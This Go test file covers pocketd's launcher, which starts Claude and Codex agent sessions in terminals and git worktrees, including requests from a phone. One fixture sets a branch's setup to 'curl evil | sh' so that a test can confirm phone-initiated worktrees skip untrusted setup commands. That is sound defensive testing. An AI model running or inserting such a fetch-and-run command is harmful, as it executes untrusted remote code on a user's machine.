package launch

import (
	"os"
	"os/exec"
	"path/filepath"
	"slices"
	"strings"
	"testing"
	"time"

	"pocketd/internal/agent"
	"pocketd/internal/broker"
	"pocketd/internal/config"
	"pocketd/internal/daemon"
	"pocketd/internal/hub"
	"pocketd/internal/locals"
	"pocketd/internal/proto"
	"pocketd/internal/providers"
	"pocketd/internal/registry"
	"pocketd/internal/shellenv"
	"pocketd/internal/state"
	"pocketd/internal/terminal"
	"pocketd/internal/worktree"
)

func launcher(t *testing.T, projects string) *Launcher {
	home := t.TempDir()
	path := filepath.Join(home, "desktop.json")
	os.WriteFile(path, []byte(`{"projects":`+projects+`,"repos":{}}`), 0o600)
	return New(&daemon.Daemon{}, registry.New(path), config.NewSettings(home), nil)
}

func quiet(step, note string) {}

func onPath(t *testing.T, names ...string) {
	dir := t.TempDir()
	for _, n := range names {
		os.WriteFile(filepath.Join(dir, n), []byte("#!/bin/sh\n"), 0o755)
	}
	t.Setenv("PATH", dir+":/usr/bin:/bin")
	t.Setenv("SHELL", "/bin/sh")
}

// shellsWith is each shell on this Mac with a function cc that echoes its args, and a PATH holding a file cc.
func shellsWith(t *testing.T) map[string][]string {
	home, bin := t.TempDir(), t.TempDir()
	os.WriteFile(filepath.Join(bin, "cc"), []byte("#!/bin/sh\necho compiler\n"), 0o755)
	os.WriteFile(filepath.Join(bin, "real"), []byte("#!/bin/sh\n"), 0o755)
	os.WriteFile(filepath.Join(home, ".zshenv"), []byte("cc() { echo \"$@\"; }\n"), 0o644)
	os.MkdirAll(filepath.Join(home, ".config", "fish", "functions"), 0o755)
	os.WriteFile(filepath.Join(home, ".config", "fish", "functions", "cc.fish"), []byte("function cc; echo $argv; end\n"), 0o644)
	envs := map[string][]string{}
	for _, shell := range []string{"/bin/zsh", "fish"} {
		if path, err := exec.LookPath(shell); err == nil {
			envs[path] = []string{"HOME=" + home, "ZDOTDIR=" + home, "PATH=" + bin + ":/usr/bin:/bin", "SHELL=" + path}
		}
	}
	return envs
}

func TestAShellFunctionWinsOverTheFileOfTheSameNameAsInTheUsersTerminal(t *testing.T) {
	for shell, env := range shellsWith(t) {
		if got, err := resolve("cc", env); got != "cc" || err != nil {
			t.Errorf("%s: cc resolves to %q, %v", shell, got, err)
		}
		if got, _ := resolve("real", env); !strings.HasSuffix(got, "/real") {
			t.Errorf("%s: real resolves to %q", shell, got)
		}
		if _, err := resolve("missing", env); err == nil {
			t.Errorf("%s: a missing command was found", shell)
		}
	}
}

func TestNamingRunsAShellFunctionThroughTheShell(t *testing.T) {
	for shell, env := range shellsWith(t) {
		n, err := generate("claude", "cc", `{"title":"Fix login"}`, env)
		if err != nil || n.Title != "Fix login" {
			t.Errorf("%s: got %+v, %v", shell, n, err)
		}
	}
}

func TestProvidersShowWhatIsInstalledAndTheCeiling(t *testing.T) {
	onPath(t, "claude")
	l := launcher(t, `[]`)
	list, max, phone := l.Providers(Who{Owner: true, Key: "owner"})
	if len(list) != 2 || !list[0].Available || list[1].Available || len(list[0].Efforts) != 5 || !list[0].Plan || list[1].Plan {
		t.Fatalf("got %+v", list)
	}
	if list[1].Efforts == nil || len(list[1].Efforts) != 0 || list[0].ID != "claude" || list[1].ID != "codex" {
		t.Fatalf("got %+v", list)
	}
	if list[0].Chat != (providers.Chat{Interrupt: true, Compact: true, SendWhileWorking: true, SubAgents: true, SendNow: true}) ||
		list[1].Chat != (providers.Chat{Interrupt: true, Compact: true, SendWhileWorking: true, SubAgents: false}) {
		t.Fatalf("chat %+v %+v", list[0].Chat, list[1].Chat)
	}
	if max != "full" || phone != "ask" {
		t.Fatalf("owner: max %q phone %q", max, phone)
	}
	if _, max, _ := l.Providers(Who{Key: "device:d1"}); max != "ask" {
		t.Fatalf("device: max %q", max)
	}
}

func TestAProviderStartsFromTheCommandConfigSetNamed(t *testing.T) {
	onPath(t, "claude")
	l := launcher(t, `[]`)
	dir := t.TempDir()
	custom, plain := filepath.Join(dir, "claude-dev"), filepath.Join(dir, "notes")
	os.WriteFile(custom, []byte("#!/bin/sh\n"), 0o755)
	os.WriteFile(plain, []byte("x"), 0o644)
	if err := l.CheckCommand(plain); err == nil {
		t.Fatal("a file that isn't executable was accepted")
	}
	if err := l.CheckCommand(custom); err != nil {
		t.Fatal(err)
	}
	l.set.Set("claude.command", custom)
	l.set.Set("codex.command", plain)
	if paths := l.Paths(); paths["claude"] != custom || paths["codex"] != "" {
		t.Fatalf("got %v", paths)
	}
}

func TestThePhoneIsHeldToItsCeiling(t *testing.T) {
	project := t.TempDir()
	l := launcher(t, `["`+project+`"]`)
	s := spec("claude", "auto", false)
	s.Project = project
	r := l.Create(Who{Key: "device:d1"}, "r1", s, quiet, func(Creating) { t.Fatal("creating") })
	if r.Err == nil || r.Err.Code != "access_not_allowed" || r.Err.Message != "On your Mac: ⌘K → Phone access level" {
		t.Fatalf("got %+v", r.Err)
	}
}

func TestCreateRefusesAnUnknownProjectOrAMissingProvider(t *testing.T) {
	onPath(t)
	project := t.TempDir()
	l := launcher(t, `["`+project+`"]`)
	owner := Who{Owner: true, Key: "owner"}
	s := spec("claude", "ask", false)
	if r := l.Create(owner, "r1", s, quiet, nil); r.Err == nil || r.Err.Code != "unknown_project" {
		t.Fatalf("got %+v", r.Err)
	}
	s.Project = project
	if r := l.Create(owner, "r2", s, quiet, nil); r.Err == nil || r.Err.Code != "provider_unavailable" {
		t.Fatalf("got %+v", r.Err)
	}
	s.Provider = "codex"
	if r := l.Create(owner, "r2", s, quiet, nil); r.Err == nil || r.Err.Code != "duplicate" {
		t.Fatalf("got %+v", r.Err)
	}
}

func TestAnUntrustedClaudeFolderIsRefusedForThePhone(t *testing.T) {
	onPath(t, "claude")
	t.Setenv("CLAUDE_CONFIG_DIR", t.TempDir())
	t.Setenv("CLAUDE_CODE_SANDBOXED", "")
	project, _ := filepath.EvalSymlinks(t.TempDir())
	git(t, project, "init", "-q", "-b", "main")
	git(t, project, "commit", "-q", "--allow-empty", "-m", "init")
	l := launcher(t, `["`+project+`"]`)
	s := spec("claude", "ask", false)
	s.Project, s.Checkout.Worktree = project, project
	r := l.Create(Who{Key: "device:d1"}, "r1", s, quiet, func(Creating) { t.Fatal("creating") })
	if r.Err == nil || r.Err.Code != "folder_not_trusted" || r.Err.Message != "Trust this folder in Claude on your Mac first" {
		t.Fatalf("got %+v", r.Err)
	}
	s.Checkout = proto.Checkout{New: &proto.NewWorktree{Name: "calm-otter"}}
	if r := l.Create(Who{Key: "device:d1"}, "r2", s, quiet, nil); r.Err == nil || r.Err.Code != "folder_not_trusted" {
		t.Fatalf("got %+v", r.Err)
	}
	if out, _ := exec.Command("git", "-C", project, "worktree", "list", "--porcelain").Output(); strings.Count(string(out), "worktree ") != 1 {
		t.Fatalf("a Worktree was made before the refusal:\n%s", out)
	}
}

func TestAnAgentExitFailsItsRestore(t *testing.T) {
	h := hub.New()
	d := &daemon.Daemon{Terminals: terminal.NewManager(), Agents: agent.NewRegistry(h), Broker: broker.New(h), Home: t.TempDir(), Exe: "/bin/true",
		Registry: registry.New(filepath.Join(t.TempDir(), "desktop.json"))}
	reasons := make(chan string, 1)
	d.Resume = func(state.Terminal) (string, []string, string) { return "/bin/sh", []string{"-c", "sleep 30"}, "" }
	d.OnRestore = func(_ string, _ bool, _ int64, _, reason string) { reasons <- reason }
	d.Restore(state.File{Version: state.Version, Terminals: []state.Terminal{{TerminalID: "t-1", LaunchDir: t.TempDir(), Cols: 80, Rows: 24,
		Provider: "claude", ConversationID: "c1", Launch: &state.Launch{Access: "ask"}, AgentID: "a-1"}}}, "/bin/sh")
	t.Cleanup(d.Terminals.Get("t-1").Close)
	New(d, d.Registry, config.NewSettings(t.TempDir()), nil).Exited("t-1", "agent", 1)
	select {
	case r := <-reasons:
		if r != "agent_exited" {
			t.Fatalf("reason = %q", r)
		}
	case <-time.After(5 * time.Second):
		t.Fatal("no restore report")
	}
}

func TestACreateWhoseAgentNeverShowsUpFailsAtItsDeadline(t *testing.T) {
	defer func(w time.Duration) { createWait = w }(createWait)
	createWait = 500 * time.Millisecond
	onPath(t, "claude")
	t.Setenv("SHELL", "/bin/sh")
	project, _ := filepath.EvalSymlinks(t.TempDir())
	git(t, project, "init", "-q", "-b", "main")
	git(t, project, "commit", "-q", "--allow-empty", "-m", "init")
	l := launcher(t, `["`+project+`"]`)
	l.d = &daemon.Daemon{Terminals: terminal.NewManager(), Agents: agent.NewRegistry(hub.New()), Exe: "/bin/true"}
	owner := Who{Owner: true, Key: "owner"}
	s := spec("claude", "ask", false)
	s.Project, s.Checkout.Worktree = project, project
	results := make(chan Result, 1)
	go func() { results <- l.Create(owner, "r1", s, quiet, func(Creating) {}) }()
	var r Result
	select {
	case r = <-results:
	case <-time.After(5 * time.Second):
		t.Fatal("the create never ended")
	}
	if term := l.d.Terminals.Get(r.TerminalID); term != nil {
		t.Cleanup(term.Close)
	}
	if r.Err == nil || r.Err.Code != "spawn_failed" {
		t.Fatalf("got %+v", r)
	}
	if again := l.Create(owner, "r1", s, quiet, func(Creating) {}); again.Err == nil || again.Err.Code != "spawn_failed" {
		t.Fatalf("retry got %+v", again)
	}
}

func TestACreateInALocalRunsInTheProjectAndCarriesTheLocal(t *testing.T) {
	defer func(w time.Duration) { createWait = w }(createWait)
	createWait = 500 * time.Millisecond
	onPath(t, "claude")
	t.Setenv("SHELL", "/bin/sh")
	project, _ := filepath.EvalSymlinks(t.TempDir())
	git(t, project, "init", "-q", "-b", "main")
	l := launcher(t, `["`+project+`"]`)
	l.d = &daemon.Daemon{Terminals: terminal.NewManager(), Agents: agent.NewRegistry(hub.New()), Exe: "/bin/true"}
	t.Cleanup(func() { l.d.Terminals.CloseAll(0) })
	l.Locals = locals.Open(t.TempDir())
	l.Locals.Create("l1", project, "Local 2")
	s := spec("claude", "ask", false)
	s.Project, s.Checkout = project, proto.Checkout{Local: "l1"}
	var got Creating
	var local string
	l.Create(Who{Owner: true, Key: "owner"}, "r1", s, quiet, func(c Creating) {
		got, local = c, l.d.Terminals.Get(c.Terminal).Info().Local
	})
	if got.Cwd != project || got.Setup || local != "l1" {
		t.Fatalf("creating %+v in local %q", got, local)
	}
}

func TestACreateInADeletedOrForeignLocalFails(t *testing.T) {
	onPath(t, "claude")
	l := launcher(t, `["/p","/q"]`)
	l.Locals = locals.Open(t.TempDir())
	l.Locals.Create("l1", "/q", "Local 2")
	for _, id := range []string{"gone", "l1"} {
		s := spec("claude", "ask", false)
		s.Project, s.Checkout = "/p", proto.Checkout{Local: id}
		r := l.Create(Who{Owner: true, Key: "owner"}, "r-"+id, s, quiet, func(Creating) {})
		if r.Err == nil || r.Err.Code != "unknown_local" || r.Err.Message != "This Local was deleted" {
			t.Fatalf("%s: %+v", id, r.Err)
		}
	}
}

func newWorktree(t *testing.T, setup string) (*Launcher, proto.LaunchSpec) {
	onPath(t, "claude")
	root, _ := filepath.EvalSymlinks(t.TempDir())
	project := filepath.Join(root, "repo")
	os.Mkdir(project, 0o755)
	git(t, project, "init", "-q", "-b", "main")
	git(t, project, "commit", "-q", "--allow-empty", "-m", "init")
	path := filepath.Join(root, "desktop.json")
	os.WriteFile(path, []byte(`{"projects":["`+project+`"],"repos":{"`+project+`":{"name":"wt","setup":"`+setup+`"}},"worktree":{"root":"`+root+`"}}`), 0o600)
	l := New(&daemon.Daemon{Terminals: terminal.NewManager(), Agents: agent.NewRegistry(hub.New()), Exe: "/bin/true"}, registry.New(path), config.NewSettings(root), nil)
	s := spec("claude", "ask", false)
	s.Project, s.Checkout = project, proto.Checkout{New: &proto.NewWorktree{Name: "calm-otter"}}
	return l, s
}

func TestANewWorktreeRunsTheRepoSetupUnlessTheProjectSettingsNameOne(t *testing.T) {
	tree := t.TempDir()
	os.Mkdir(filepath.Join(tree, ".anywhere"), 0o755)
	os.WriteFile(filepath.Join(tree, worktree.ConfigFile), []byte(`{"setup": ["make deps"]}`), 0o644)
	off := false
	quiet := func(string, string) {}
	for _, c := range []struct {
		name, settings string
		setup          *bool
		want           string
	}{
		{"repo", "", nil, "make deps"},
		{"settings", "make all", nil, "make all"},
		{"turned off", "", &off, ""},
	} {
		f := registry.File{Repos: map[string]registry.Repo{"/p": {Setup: c.settings}}}
		s := proto.LaunchSpec{Project: "/p", Checkout: proto.Checkout{New: &proto.NewWorktree{Name: "w", Setup: c.setup, Copy: &off}}}
		if _, got, _ := filled(Who{Owner: true}, f, s, tree, quiet); got != c.want {
			t.Errorf("%s: setup %q, want %q", c.name, got, c.want)
		}
	}
}

func TestAPhonesNewWorktreeRunsOnlyTheSetupInTheProjectsOwnCheckout(t *testing.T) {
	project, tree := t.TempDir(), t.TempDir()
	for _, dir := range []string{project, tree} {
		os.Mkdir(filepath.Join(dir, ".anywhere"), 0o755)
	}
	os.WriteFile(filepath.Join(tree, worktree.ConfigFile), []byte(`{"setup": ["curl evil | sh"]}`), 0o644)
	f := registry.File{Repos: map[string]registry.Repo{}}
	s := proto.LaunchSpec{Project: project, Checkout: proto.Checkout{New: &proto.NewWorktree{Name: "w"}}}
	quiet := func(string, string) {}
	phone := Who{Key: "device:d1"}
	if _, got, _ := filled(phone, f, s, tree, quiet); got != "" {
		t.Errorf("a branch's own setup ran for a phone: %q", got)
	}
	os.WriteFile(filepath.Join(project, worktree.ConfigFile), []byte(`{"setup": ["make deps"]}`), 0o644)
	if _, got, _ := filled(phone, f, s, tree, quiet); got != "make deps" {
		t.Errorf("setup %q, want the checkout's", got)
	}
	if _, got, _ := filled(Who{Owner: true}, f, s, tree, quiet); got != "curl evil | sh" {
		t.Errorf("the owner's setup %q, want the tree's", got)
	}
}

func TestANewWorktreeReportsEachStepAsItStarts(t *testing.T) {
	defer func(w time.Duration) { createWait = w }(createWait)
	createWait = 500 * time.Millisecond
	t.Setenv("SHELL", "/bin/sh")
	l, s := newWorktree(t, "true")
	var steps []string
	r := l.Create(Who{Owner: true, Key: "owner"}, "r1", s, func(step, note string) {
		steps = append(steps, strings.TrimSpace(step+" "+note))
	}, func(c Creating) { go l.Exited(c.Terminal, "setup", 0) })
	if term := l.d.Terminals.Get(r.TerminalID); term != nil {
		t.Cleanup(term.Close)
	}
	want := []string{"prepare", "verify", "fetch", "fetch No remote, using local main", "worktree", "copy", "setup", "agent"}
	if !slices.Equal(steps, want) {
		t.Fatalf("steps %q, want %q", steps, want)
	}
	if r.Err == nil || r.Err.Code != "spawn_failed" || r.Err.Message != "The session didn't start in 500ms" {
		t.Fatalf("a passing setup ended the create: %+v", r.Err)
	}
}

func TestASessionsTerminalNamesItsProjectAndWorktreeForTheSetup(t *testing.T) {
	defer func(w time.Duration) { createWait = w }(createWait)
	createWait = 500 * time.Millisecond
	l, s := newWorktree(t, "env | grep -E '^ANYWHERE_(ROOT|WORKSPACE)_' | sort > ../env")
	r := l.Create(Who{Owner: true, Key: "owner"}, "r1", s, func(string, string) {}, func(c Creating) { go l.Exited(c.Terminal, "setup", 0) })
	if term := l.d.Terminals.Get(r.TerminalID); term != nil {
		t.Cleanup(term.Close)
	}
	want := "ANYWHERE_ROOT_PATH=" + s.Project + "\nANYWHERE_WORKSPACE_NAME=" + filepath.Base(r.Cwd) + "\nANYWHERE_WORKSPACE_PATH=" + r.Cwd + "\n"
	var got []byte
	for end := time.Now().Add(5 * time.Second); time.Now().Before(end); time.Sleep(20 * time.Millisecond) {
		if got, _ = os.ReadFile(filepath.Join(filepath.Dir(r.Cwd), "env")); string(got) == want {
			return
		}
	}
	t.Fatalf("setup saw %q, want %q", got, want)
}

func TestATerminalThatCantStartFailsTheStepAfterTheWorktree(t *testing.T) {
	l, s := newWorktree(t, "")
	claude, _ := exec.LookPath("claude")
	l.set.Set("claude.command", claude)
	notAProgram := filepath.Join(t.TempDir(), "shell")
	if err := os.WriteFile(notAProgram, []byte("not a program"), 0o755); err != nil {
		t.Fatal(err)
	}
	t.Setenv("SHELL", notAProgram)
	var steps []string
	r := l.Create(Who{Owner: true, Key: "owner"}, "r1", s, func(step, note string) { steps = append(steps, step) }, func(Creating) {})
	if r.Err == nil || r.Err.Message != "Couldn't start a terminal" {
		t.Fatalf("got %+v", r.Err)
	}
	if last := steps[len(steps)-1]; last != proto.StepAgent {
		t.Fatalf("steps %q", steps)
	}
}

// opening runs a create for branch in a newWorktree project and gives its
// steps and the folder its terminal started in.
func opening(t *testing.T, branch string) (steps []string, cwd string) {
	defer func(w time.Duration) { createWait = w }(createWait)
	createWait = 500 * time.Millisecond
	t.Setenv("SHELL", "/bin/sh")
	l, s := newWorktree(t, "true")
	git(t, s.Project, "branch", "feat")
	s.Checkout.New = &proto.NewWorktree{Branch: branch}
	r := l.Create(Who{Owner: true, Key: "owner"}, "r1", s, func(step, note string) {
		steps = append(steps, strings.TrimSpace(step+" "+note))
	}, func(c Creating) {
		if cwd = c.Cwd; c.Setup {
			go l.Exited(c.Terminal, "setup", 0)
		}
	})
	if term := l.d.Terminals.Get(r.TerminalID); term != nil {
		t.Cleanup(term.Close)
	}
	return steps, cwd
}

func TestABranchOpensInItsOwnWorktreeWithCopyAndSetup(t *testing.T) {
	steps, cwd := opening(t, "feat")
	want := []string{"prepare", "verify", "fetch", "worktree", "copy", "setup", "agent"}
	if !slices.Equal(steps, want) || filepath.Base(cwd) != "feat" || filepath.Base(filepath.Dir(cwd)) != "wt" {
		t.Fatalf("steps %q in %s", steps, cwd)
	}
}

func TestABranchAlreadyCheckedOutIsUsedWithoutCopyOrSetup(t *testing.T) {
	steps, cwd := opening(t, "main")
	want := []string{"prepare", "verify", "fetch", "worktree", "worktree Already open in repo", "agent"}
	if !slices.Equal(steps, want) || filepath.Base(cwd) != "repo" {
		t.Fatalf("steps %q in %s", steps, cwd)
	}
}

func TestAPRWithoutGhAsksToInstallIt(t *testing.T) {
	l, s := newWorktree(t, "")
	s.Checkout.New = &proto.NewWorktree{PR: "7"}
	r := l.Create(Who{Owner: true, Key: "owner"}, "r1", s, func(string, string) {}, func(Creating) {})
	if r.Err == nil || r.Err.Code != "spawn_failed" || r.Err.Message != "Install GitHub CLI (gh) to open pull requests" {
		t.Fatalf("got %+v", r.Err)
	}
}

func TestASessionsShellThatIsntInstalledFallsBackToTheLoginShell(t *testing.T) {
	if got := shellOf([]string{"SHELL=/no/such/fish"}); got != shellenv.LoginShell() {
		t.Fatal(got)
	}
	if got := shellOf([]string{"SHELL=/bin/sh"}); got != "/bin/sh" {
		t.Fatal(got)
	}
}
